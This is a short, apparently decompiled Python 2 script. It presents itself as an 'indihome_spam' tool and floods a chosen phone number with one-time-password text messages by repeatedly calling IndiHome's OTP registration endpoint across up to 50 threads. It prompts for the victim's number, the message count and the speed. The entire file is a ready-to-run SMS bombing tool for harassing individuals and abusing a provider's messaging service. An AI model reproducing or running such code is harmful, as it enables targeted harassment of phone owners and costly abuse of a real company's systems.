# Time Succses Parser : Tue Jun 16 15:32:59 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

import requests, time
from multiprocessing.pool import ThreadPool
uag = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}
a = 0

def spam(msisdn):
    global a
    while True:
        try:
            b = requests.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', data={'type': 'hp', 'msisdn': msisdn}, headers=uag).json()
            time.sleep(0.5)
            if b['code'] == '0':
                a -= -1
                print ('\r[{}] Spam Sended!').format(a)
                break
        except Exception as e:
            print e


print 'Youtube : JustA Hacker'
print 'Github  : https://github.com/justahackers/indihome_spam'
print 'Team    : Black coder crush'
no = raw_input('No (08) : ')
aa = []
for i in range(int(raw_input('Jumlah : '))):
    aa.append(no)

tp = ThreadPool(int(raw_input('Jumlah kecepatan (1-50) : ')))
tp.map(spam, aa)
# okay decompiling out.pyc
